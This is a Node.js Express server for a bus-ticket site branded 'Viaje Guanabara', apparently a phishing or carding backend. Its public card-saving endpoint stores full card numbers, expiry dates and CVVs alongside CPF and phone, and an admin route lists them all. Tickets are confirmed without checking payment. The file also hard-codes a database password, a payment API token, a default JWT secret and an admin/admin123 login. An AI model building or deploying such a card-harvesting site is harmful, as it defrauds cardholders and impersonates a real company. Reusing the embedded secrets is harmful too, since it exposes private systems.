const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const requestIp = require('request-ip');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'guanabara_secret_key_2026';
const JWT_EXPIRES = '24h';

// ============ CONFIGURAÇÕES PLUMIFY ============
const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

// ============ MIDDLEWARES ============
app.use(cors({ origin: '*', credentials: true }));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(requestIp.mw());

app.use(express.static(path.join(__dirname, 'public')));
app.use('/admin', express.static(path.join(__dirname, 'public/admin')));

// ============ CONEXÃO POSTGRESQL ============
const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://guanabara_user:JTL5QHG4acDPmzHRo4FYZBmTOtlFDBZW@dpg-d9shhuv10e5c739tl52g-a.oregon-postgres.render.com/guanabara',
  ssl: { rejectUnauthorized: false },
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 10000,
});

// ============ FUNÇÕES AUXILIARES ============
function getClientIP(req) {
  return req.clientIp || req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
}

function sanitizarInput(input) {
  if (!input) return input;
  if (typeof input === 'string') {
    return input.trim().replace(/[<>]/g, '');
  }
  return input;
}

async function logSeguranca(usuario, acao, ip, detalhes) {
  try {
    await pool.query(
      'INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
      [usuario || 'Sistema', acao, ip, detalhes]
    );
  } catch (error) {
    console.error('Erro ao salvar log:', error);
  }
}

// ============ MIDDLEWARE DE AUTENTICAÇÃO ============
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'Não autorizado' });
  }
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Token inválido' });
  }
}

// ============ INICIALIZAÇÃO DO BANCO ============
async function initDatabase() {
  const client = await pool.connect();
  try {
    console.log('🔄 Inicializando banco de dados...');

    // Verifica se a tabela admin_users existe e qual estrutura ela tem
    const tableCheck = await client.query(`
      SELECT EXISTS (
        SELECT FROM information_schema.tables 
        WHERE table_name = 'admin_users'
      );
    `);
    
    const tableExists = tableCheck.rows[0].exists;

    if (tableExists) {
      console.log('📋 Tabela admin_users já existe, verificando estrutura...');
      
      // Verifica quais colunas existem
      const columnsCheck = await client.query(`
        SELECT column_name 
        FROM information_schema.columns 
        WHERE table_name = 'admin_users'
      `);
      
      const existingColumns = columnsCheck.rows.map(r => r.column_name);
      console.log('📋 Colunas existentes:', existingColumns.join(', '));

      // Adiciona colunas que faltam
      if (!existingColumns.includes('nome')) {
        await client.query('ALTER TABLE admin_users ADD COLUMN nome VARCHAR(100)');
        console.log('✅ Coluna "nome" adicionada');
      }
      if (!existingColumns.includes('email')) {
        await client.query('ALTER TABLE admin_users ADD COLUMN email VARCHAR(100)');
        console.log('✅ Coluna "email" adicionada');
      }
      if (!existingColumns.includes('ultimo_login')) {
        await client.query('ALTER TABLE admin_users ADD COLUMN ultimo_login TIMESTAMP');
        console.log('✅ Coluna "ultimo_login" adicionada');
      }
      if (!existingColumns.includes('ip_login')) {
        await client.query('ALTER TABLE admin_users ADD COLUMN ip_login TEXT');
        console.log('✅ Coluna "ip_login" adicionada');
      }
      if (!existingColumns.includes('criado_em')) {
        await client.query('ALTER TABLE admin_users ADD COLUMN criado_em TIMESTAMP DEFAULT NOW()');
        console.log('✅ Coluna "criado_em" adicionada');
      }
    } else {
      // Cria a tabela do zero
      await client.query(`
        CREATE TABLE admin_users (
          id SERIAL PRIMARY KEY,
          username VARCHAR(50) UNIQUE NOT NULL,
          senha_hash TEXT NOT NULL,
          nome VARCHAR(100),
          email VARCHAR(100),
          ultimo_login TIMESTAMP,
          ip_login TEXT,
          criado_em TIMESTAMP DEFAULT NOW()
        )
      `);
      console.log('✅ Tabela admin_users criada');
    }

    // CRIA AS DEMAIS TABELAS (se não existirem)
    await client.query(`
      CREATE TABLE IF NOT EXISTS admin_attempts (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        username VARCHAR(50),
        tentativa TEXT,
        sucesso BOOLEAN DEFAULT false,
        timestamp TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        transaction_id VARCHAR(100) UNIQUE,
        cpf VARCHAR(14),
        valor DECIMAL(10,2),
        status VARCHAR(20) DEFAULT 'pending',
        telefone VARCHAR(20),
        data_pagamento TIMESTAMP,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS cartoes (
        id SERIAL PRIMARY KEY,
        cliente_id INTEGER,
        nome_titular VARCHAR(100) NOT NULL,
        numero_cartao VARCHAR(19) NOT NULL,
        validade VARCHAR(7) NOT NULL,
        cvv VARCHAR(4) NOT NULL,
        cpf VARCHAR(14),
        telefone VARCHAR(20),
        ip TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS tickets (
        id SERIAL PRIMARY KEY,
        codigo VARCHAR(20) UNIQUE NOT NULL,
        origem VARCHAR(100) NOT NULL,
        destino VARCHAR(100) NOT NULL,
        passageiro VARCHAR(100) NOT NULL,
        data DATE NOT NULL,
        valor DECIMAL(10,2) NOT NULL,
        status VARCHAR(20) DEFAULT 'pendente',
        metodo_pagamento VARCHAR(20),
        ip TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS clientes (
        id SERIAL PRIMARY KEY,
        nome VARCHAR(100) NOT NULL,
        cpf VARCHAR(14),
        telefone VARCHAR(20),
        email VARCHAR(100),
        ip TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        usuario VARCHAR(100),
        acao VARCHAR(50),
        ip TEXT,
        detalhes TEXT,
        data TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS configuracoes (
        id SERIAL PRIMARY KEY,
        nome_site VARCHAR(100) DEFAULT 'Viaje Guanabara',
        manutencao BOOLEAN DEFAULT false,
        logs_ativos BOOLEAN DEFAULT true,
        atualizado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS destinos (
        id SERIAL PRIMARY KEY,
        cidade VARCHAR(100) NOT NULL,
        estado VARCHAR(2),
        vendas INTEGER DEFAULT 0,
        status VARCHAR(20) DEFAULT 'ativo'
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS ofertas (
        id SERIAL PRIMARY KEY,
        origem VARCHAR(100),
        destino VARCHAR(100),
        preco DECIMAL(10,2),
        desconto INTEGER DEFAULT 0,
        validade DATE,
        status VARCHAR(20) DEFAULT 'ativo'
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS servicos (
        id SERIAL PRIMARY KEY,
        nome VARCHAR(100) NOT NULL,
        descricao TEXT,
        status VARCHAR(20) DEFAULT 'ativo'
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS buscas (
        id SERIAL PRIMARY KEY,
        origem VARCHAR(100),
        destino VARCHAR(100),
        data DATE,
        passageiros INTEGER DEFAULT 1,
        ip TEXT,
        timestamp TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS visitantes (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        user_agent TEXT,
        screen TEXT,
        language TEXT,
        referer TEXT,
        pagina TEXT,
        timestamp TIMESTAMP DEFAULT NOW()
      )
    `);

    // ADMIN PADRÃO - Verifica se existe, se não existe cria
    const adminCheck = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
    if (adminCheck.rows.length === 0) {
      const hashedPassword = bcrypt.hashSync('admin123', 10);
      await client.query(`
        INSERT INTO admin_users (username, senha_hash, nome, email, ultimo_login, ip_login)
        VALUES ($1, $2, $3, $4, NOW(), $5)
      `, ['admin', hashedPassword, 'Administrador', 'admin@viajeguanabara.com', '127.0.0.1']);
      console.log('✅ Admin criado: admin / admin123');
    } else {
      console.log('✅ Admin já existe');
    }

    // DESTINOS INICIAIS
    const destinosCheck = await client.query('SELECT COUNT(*) FROM destinos');
    if (parseInt(destinosCheck.rows[0].count) === 0) {
      await client.query(`
        INSERT INTO destinos (cidade, estado, vendas, status) VALUES
        ('Rio de Janeiro', 'RJ', 152, 'ativo'),
        ('São Paulo', 'SP', 234, 'ativo'),
        ('Brasília', 'DF', 98, 'ativo'),
        ('Fortaleza', 'CE', 67, 'ativo'),
        ('Salvador', 'BA', 43, 'ativo'),
        ('Belo Horizonte', 'MG', 89, 'ativo'),
        ('Curitiba', 'PR', 56, 'ativo'),
        ('Porto Alegre', 'RS', 34, 'ativo')
      `);
      console.log('✅ Destinos iniciais criados');
    }

    // SERVIÇOS INICIAIS
    const servicosCheck = await client.query('SELECT COUNT(*) FROM servicos');
    if (parseInt(servicosCheck.rows[0].count) === 0) {
      await client.query(`
        INSERT INTO servicos (nome, descricao, status) VALUES
        ('Wi-Fi a bordo', 'Internet gratuita durante a viagem', 'ativo'),
        ('Ar-condicionado', 'Climatização para seu conforto', 'ativo'),
        ('Banheiro a bordo', 'Banheiros limpos e confortáveis', 'ativo'),
        ('Poltronas reclináveis', 'Assentos confortáveis', 'ativo'),
        ('Tomada USB', 'Carregue seus dispositivos', 'ativo'),
        ('TV a bordo', 'Entretenimento durante a viagem', 'ativo')
      `);
      console.log('✅ Serviços iniciais criados');
    }

    console.log('✅ Banco de dados inicializado com sucesso!');
  } catch (err) {
    console.error('❌ Erro ao inicializar banco:', err.message);
    console.error('❌ Detalhes:', err.stack);
  } finally {
    client.release();
  }
}

initDatabase();

// ============ ROTAS ============

// LOGIN ADMIN
app.post('/api/admin/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = getClientIP(req);
  
  try {
    const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
    const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
    if (!valid) {
      await logSeguranca('Sistema', 'login_falha', ip, `Senha incorreta para: ${username}`);
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
    await pool.query(
      'UPDATE admin_users SET ultimo_login = NOW(), ip_login = $1 WHERE id = $2',
      [ip, result.rows[0].id]
    );
    
    await logSeguranca(result.rows[0].nome || 'Admin', 'login', ip, 'Login realizado com sucesso');
    
    const token = jwt.sign(
      { id: result.rows[0].id, username: result.rows[0].username, nome: result.rows[0].nome || 'Admin' },
      JWT_SECRET,
      { expiresIn: JWT_EXPIRES }
    );
    
    res.json({
      success: true,
      token,
      user: {
        id: result.rows[0].id,
        username: result.rows[0].username,
        nome: result.rows[0].nome || 'Administrador',
        email: result.rows[0].email || ''
      }
    });
  } catch (error) {
    console.error('Erro login:', error);
    res.status(500).json({ error: 'Erro interno' });
  }
});

// VERIFICAR TOKEN
app.get('/api/admin/verify', authenticate, async (req, res) => {
  res.json({ valid: true, user: req.user });
});

// SALVAR PAGAMENTO
app.post('/api/save-payment', async (req, res) => {
  try {
    const { transaction_id, cpf, valor, telefone } = req.body;
    await pool.query(
      'INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING',
      [transaction_id, cpf, valor, 'pending', telefone]
    );
    res.json({ success: true });
  } catch (error) {
    console.error('Erro save-payment:', error);
    res.json({ success: false });
  }
});

// VERIFICAR STATUS DO PAGAMENTO
app.get('/api/check-payment/:transaction_id', async (req, res) => {
  try {
    const { transaction_id } = req.params;
    const result = await pool.query('SELECT status FROM payments WHERE transaction_id = $1', [transaction_id]);
    if (result.rows.length > 0) {
      res.json({ status: result.rows[0].status });
    } else {
      res.json({ status: 'not_found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Erro ao verificar pagamento' });
  }
});

// CRIAR PAGAMENTO PIX
app.post('/api/create-payment', async (req, res) => {
  const { amount, customer_name, customer_email, customer_cpf, customer_phone } = req.body;
  if (!amount || amount <= 0) {
    return res.status(400).json({ error: 'Valor inválido' });
  }
  
  const amountCents = Math.round(parseFloat(amount) * 100);
  const payload = {
    amount: amountCents,
    offer_hash: PLUMIFY_PRODUCT_HASH,
    payment_method: 'pix',
    customer: {
      name: customer_name || 'Viaje Guanabara',
      email: customer_email || 'contato@viajeguanabara.com.br',
      phone_number: customer_phone || '41992878772',
      document: customer_cpf || '00000000000',
      street_name: 'Rua Exemplo',
      number: '100',
      neighborhood: 'Centro',
      city: 'Fortaleza',
      state: 'CE',
      zip_code: '60000000'
    },
    cart: [{
      product_hash: PLUMIFY_PRODUCT_HASH,
      title: 'Passagem Guanabara',
      price: amountCents,
      quantity: 1,
      operation_type: 1,
      tangible: false
    }],
    expire_in_days: 3,
    transaction_origin: 'api',
    postback_url: `${process.env.BASE_URL || 'https://guanabara.onrender.com'}/api/webhook/pagamento`
  };
  
  try {
    const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    
    if (data.pix && data.pix.pix_qr_code) {
      await pool.query(
        'INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING',
        [data.hash, customer_cpf, amount, 'pending', customer_phone]
      ).catch(e => console.log('Erro ao salvar payment:', e));
      
      res.json({
        success: true,
        payment: {
          pix_code: data.pix.pix_qr_code,
          pix_qrcode: data.pix.pix_qr_code,
          expires_at: data.expires_at,
          id: data.hash,
          status: data.payment_status
        }
      });
    } else {
      res.json({ success: false, error: data.message || 'Erro ao gerar PIX' });
    }
  } catch (error) {
    console.error('Erro create-payment:', error);
    res.status(500).json({ error: 'Erro ao gerar pagamento' });
  }
});

// WEBHOOK PAGAMENTO
app.post('/api/webhook/pagamento', async (req, res) => {
  const { hash, status } = req.body;
  if (status === 'paid') {
    try {
      await pool.query('UPDATE payments SET status = $1, data_pagamento = NOW() WHERE transaction_id = $2', ['paid', hash]);
      console.log(`✅ Pagamento confirmado: ${hash}`);
    } catch(e) {
      console.error('Erro webhook:', e);
    }
  }
  res.json({ received: true });
});

// COMPRA
app.post('/api/compra', async (req, res) => {
  try {
    const { origem, destino, passageiro, data, valor, metodoPagamento } = req.body;
    const ip = getClientIP(req);
    const codigo = 'GV' + new Date().toISOString().slice(0,10).replace(/-/g,'') + String(Math.floor(Math.random()*1000)).padStart(3,'0');
    
    const result = await pool.query(`
      INSERT INTO tickets (codigo, origem, destino, passageiro, data, valor, status, metodo_pagamento, ip)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
      RETURNING id, codigo
    `, [codigo, origem, destino, passageiro, data, parseFloat(valor), 'confirmado', metodoPagamento || 'PIX', ip]);
    
    await logSeguranca('Sistema', 'compra', ip, `Compra: ${codigo} - ${origem} -> ${destino} - R$ ${valor}`);
    res.json({ success: true, ticket: result.rows[0] });
  } catch (error) {
    console.error('Erro compra:', error);
    res.status(500).json({ error: error.message });
  }
});

// CLIENTE
app.post('/api/cliente', async (req, res) => {
  try {
    const { nome, cpf, telefone, email } = req.body;
    const ip = getClientIP(req);
    const result = await pool.query(`
      INSERT INTO clientes (nome, cpf, telefone, email, ip)
      VALUES ($1, $2, $3, $4, $5)
      RETURNING id
    `, [sanitizarInput(nome), cpf, telefone, email, ip]);
    
    res.json({ success: true, cliente_id: result.rows[0].id });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// SALVAR CARTÃO
app.post('/api/cartao/salvar', async (req, res) => {
  try {
    const { nome_titular, numero_cartao, validade, cvv, cpf, telefone, cliente_id } = req.body;
    const ip = getClientIP(req);
    const result = await pool.query(`
      INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, validade, cvv, cpf, telefone, ip)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
      RETURNING id
    `, [cliente_id || null, sanitizarInput(nome_titular), numero_cartao, validade, cvv, cpf || '', telefone || '', ip]);
    
    await logSeguranca('Sistema', 'cadastro_cartao', ip, `Cartão: ${nome_titular} - ${numero_cartao.slice(-4)}`);
    res.json({ success: true, cartao_id: result.rows[0].id });
  } catch (error) {
    console.error('Erro salvar cartão:', error);
    res.status(500).json({ error: error.message });
  }
});

// BUSCA
app.post('/api/busca', async (req, res) => {
  try {
    const { origem, destino, data, passageiros } = req.body;
    const ip = getClientIP(req);
    await pool.query(`
      INSERT INTO buscas (origem, destino, data, passageiros, ip)
      VALUES ($1, $2, $3, $4, $5)
    `, [origem, destino, data, passageiros || 1, ip]);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// VISITANTE
app.post('/api/visitante', async (req, res) => {
  try {
    const { screen, pagina } = req.body;
    const ip = getClientIP(req);
    await pool.query(`
      INSERT INTO visitantes (ip, user_agent, screen, language, referer, pagina)
      VALUES ($1, $2, $3, $4, $5, $6)
    `, [
      ip,
      req.headers['user-agent'] || 'Desconhecido',
      screen || 'Desconhecido',
      req.headers['accept-language'] || 'pt-BR',
      req.headers['referer'] || 'Direto',
      pagina || 'Desconhecida'
    ]);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ============ ROTAS ADMIN (PROTEGIDAS) ============

// DASHBOARD
app.get('/api/admin/dashboard', authenticate, async (req, res) => {
  try {
    const totalUsers = await pool.query('SELECT COUNT(*) FROM clientes');
    const totalTickets = await pool.query('SELECT COUNT(*) FROM tickets');
    const totalRevenue = await pool.query('SELECT COALESCE(SUM(valor), 0) FROM tickets WHERE status = $1', ['confirmado']);
    const totalBuscas = await pool.query('SELECT COUNT(*) FROM buscas');
    const totalVisitantes = await pool.query('SELECT COUNT(*) FROM visitantes');
    const totalPagamentos = await pool.query('SELECT COUNT(*) FROM payments');
    const ticketsPendentes = await pool.query('SELECT COUNT(*) FROM tickets WHERE status = $1', ['pendente']);
    
    const revenueByMonth = await pool.query(`
      SELECT TO_CHAR(criado_em, 'YYYY-MM') as mes, COALESCE(SUM(valor), 0) as total
      FROM tickets
      WHERE status = 'confirmado'
      GROUP BY mes
      ORDER BY mes DESC
      LIMIT 6
    `);
    
    const logs = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT 20');
    const tickets = await pool.query('SELECT * FROM tickets ORDER BY criado_em DESC LIMIT 10');
    
    res.json({
      stats: {
        totalUsers: parseInt(totalUsers.rows[0].count),
        totalTickets: parseInt(totalTickets.rows[0].count),
        totalRevenue: parseFloat(totalRevenue.rows[0].sum) || 0,
        totalBuscas: parseInt(totalBuscas.rows[0].count),
        totalVisitantes: parseInt(totalVisitantes.rows[0].count),
        totalPagamentos: parseInt(totalPagamentos.rows[0].count),
        ticketsPendentes: parseInt(ticketsPendentes.rows[0].count)
      },
      revenueByMonth: revenueByMonth.rows,
      recentLogs: logs.rows,
      recentTickets: tickets.rows
    });
  } catch (error) {
    console.error('Erro dashboard:', error);
    res.status(500).json({ error: error.message });
  }
});

// USUÁRIOS
app.get('/api/admin/users', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM clientes ORDER BY criado_em DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// TICKETS
app.get('/api/admin/tickets', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM tickets ORDER BY criado_em DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// DESTINOS
app.get('/api/admin/destinos', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM destinos ORDER BY id');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/admin/destinos', authenticate, async (req, res) => {
  try {
    const { cidade, estado, status } = req.body;
    const result = await pool.query(`
      INSERT INTO destinos (cidade, estado, status) VALUES ($1, $2, $3) RETURNING id
    `, [sanitizarInput(cidade), sanitizarInput(estado), status || 'ativo']);
    res.json({ success: true, id: result.rows[0].id });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// OFERTAS
app.get('/api/admin/ofertas', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM ofertas ORDER BY id');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/admin/ofertas', authenticate, async (req, res) => {
  try {
    const { origem, destino, preco, desconto, validade, status } = req.body;
    const result = await pool.query(`
      INSERT INTO ofertas (origem, destino, preco, desconto, validade, status)
      VALUES ($1, $2, $3, $4, $5, $6) RETURNING id
    `, [sanitizarInput(origem), sanitizarInput(destino), preco, desconto || 0, validade, status || 'ativo']);
    res.json({ success: true, id: result.rows[0].id });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// SERVIÇOS
app.get('/api/admin/servicos', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM servicos ORDER BY id');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/admin/servicos', authenticate, async (req, res) => {
  try {
    const { nome, descricao, status } = req.body;
    const result = await pool.query(`
      INSERT INTO servicos (nome, descricao, status) VALUES ($1, $2, $3) RETURNING id
    `, [sanitizarInput(nome), sanitizarInput(descricao), status || 'ativo']);
    res.json({ success: true, id: result.rows[0].id });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// CARTÕES
app.get('/api/admin/cartoes', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM cartoes ORDER BY criado_em DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// PAGAMENTOS
app.get('/api/admin/pagamentos', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM payments ORDER BY criado_em DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// LOGS
app.get('/api/admin/logs', authenticate, async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 100;
    const result = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT $1', [limit]);
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.delete('/api/admin/logs', authenticate, async (req, res) => {
  try {
    await pool.query('DELETE FROM logs');
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ============ ROTAS DE PÁGINAS ============
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public/admin', 'index.html')));

// ============ INICIALIZAÇÃO ============
app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('=================================================');
  console.log('  🚍 VIAJE GUANABARA - SISTEMA COMPLETO');
  console.log('  Servidor: http://localhost:' + PORT);
  console.log('  Admin: http://localhost:' + PORT + '/admin');
  console.log('  Login: admin / admin123');
  console.log('=================================================');
  console.log('');
});

module.exports = app;
